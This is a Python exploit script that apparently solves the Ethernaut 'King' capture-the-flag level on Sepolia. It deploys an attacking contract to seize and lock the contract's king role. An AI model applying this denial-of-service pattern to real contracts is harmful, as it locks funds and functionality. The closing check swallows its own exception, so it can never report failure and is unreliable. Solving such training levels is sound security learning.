#!/usr/bin/python3
from ape import accounts, convert, project
from rich.console import Console

# sepolia: 0xe5Ed7BadFcf62B57D3dAC74F8Be5BF9213977Fe2
ADDRESS = "0xe5Ed7BadFcf62B57D3dAC74F8Be5BF9213977Fe2"

console = Console()


def attack():
    attacker = accounts.load("ctf")
    attacker.set_autosign(True)
    target_contract = project.King.at(ADDRESS)

    console.print(f"[green]Owner Before The Hack: [magenta]{target_contract._king()}")
    console.print("[red]Attacking Now...")
    
    prize_value = target_contract.prize()
    attacking_contract = project.KingForever.deploy(value=prize_value + convert("0.0001 ETH", int), sender=attacker)
    attacking_contract.overthrowKing(ADDRESS, sender=attacker)

    console.print(f"[green]King After The Hack: [magenta]{target_contract._king()}")

    prize_value = target_contract.prize()
    try:
        attacker.transfer(to=ADDRESS, value=prize_value, account=attacker)
        raise Exception("Still able to overthow the king!!")
    except Exception as e:
        pass


def main():
    attack()


if __name__ == "__main__":
    main()
